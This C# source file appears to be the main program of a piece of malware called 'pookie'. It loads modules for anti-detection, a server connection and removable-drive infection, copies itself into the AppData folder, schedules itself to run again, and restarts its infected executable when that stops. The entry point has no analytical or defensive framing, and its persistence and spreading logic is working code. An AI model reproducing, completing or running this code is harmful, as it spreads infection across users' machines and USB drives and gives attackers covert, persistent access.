using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace zort
{
    class Program
    {
        readonly List<IPayloadModule> modules = new List<IPayloadModule>
                {
                    new AntiDetection(),
                    new ServerCon(),
                    new RemovableInfector(),
                    //new ElevationHelper(),
                    //new ServiceManager(),
                };

        static void Main(string[] args)
        {
            var process = Process.GetCurrentProcess();
            process.PriorityClass = ProcessPriorityClass.AboveNormal;

            try
            {
                string AppdataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string AppdataRoamingPookie = Path.Combine(AppdataRoaming, "Pookie");
                string exePath = Path.Combine(AppdataRoamingPookie, "pookie.exe");
                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                bool isPookie = Path.GetFullPath(selfPath).Equals(Path.GetFullPath(exePath), StringComparison.OrdinalIgnoreCase);

                RemovableInfector.CheckIfRunningFromRemovableDrive();
                if (!RemovableInfector.IsSystemInfected())
                {
                    PersistenceHelper.CopyToTempAndScheduleRun();
                }
                else
                {
                    //Check if the exe in Public Pictures is running
                    Console.WriteLine($"Self path: {selfPath}");
                    Console.WriteLine($"Exe path: {exePath}");
                    if (isPookie)
                    {
                        Console.WriteLine("Infected file (me) is running.");
                    }
                    else
                    {
                        bool running = Process.GetProcessesByName("pookie").Length > 0;
                        if (File.Exists(exePath))
                        {
                            Console.WriteLine("Infected files found in Public Pictures.");
                            if (!running)
                            {
                                Console.WriteLine("Infected files found in Public Pictures not running. Running the infected file.");
                                var p = Process.Start(exePath);
                                //check if it exits in 5 seconds
                                p.WaitForExit(5000);
                                if (p.HasExited)
                                {
                                    //exe is broken. recopy it and continue running from here.
                                    PersistenceHelper.CopyToTempAndScheduleRun(true);
                                    Console.WriteLine("Infected file is broken. Recopying it to Public Pictures.");
                                    goto payload;
                                }
                            }
                            Environment.Exit(0);
                        }
                        else
                        {
                            Console.WriteLine("No infected files found in Public Pictures.");
                            PersistenceHelper.CopyToTempAndScheduleRun(true); //just copy and let the already existing wmi action to handle it.
                        }
                    }

                payload:
                    var program = new Program();
                    program.InitModules();
                    //Console.WriteLine("Press any key to exit...");
                    if(isPookie)
                    {
                        Thread.Sleep(Timeout.Infinite);
                    } else
                    {
                        //check if pookie is running every 5 seconds
                        while (true)
                        {
                            Thread.Sleep(5000);
                            bool running = Process.GetProcessesByName("pookie").Length > 0;
                            if (!running)
                            {
                                Console.WriteLine("Infected file is not running. Exiting.");
                                Environment.Exit(0);
                            }
                            else
                            {
                                Console.WriteLine("Infected file is running.");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
                throw;
            }
        }

        private void InitModules()
        {
            bool isAdmin = false;

            modules.ForEach(m =>
            {
                switch (m.ElevationType)
                {
                    case ElevationType.Elevated:
                        if (!isAdmin)
                        {
                            Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
                            return;
                        }
                        break;
                    case ElevationType.NonElevated:
                        if (isAdmin)
                        {
                            Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
                            return;
                        }
                        break;
                }

                Console.WriteLine($"Starting module {m.ModuleName}");
                m.Start();
            });
        }
    }
}
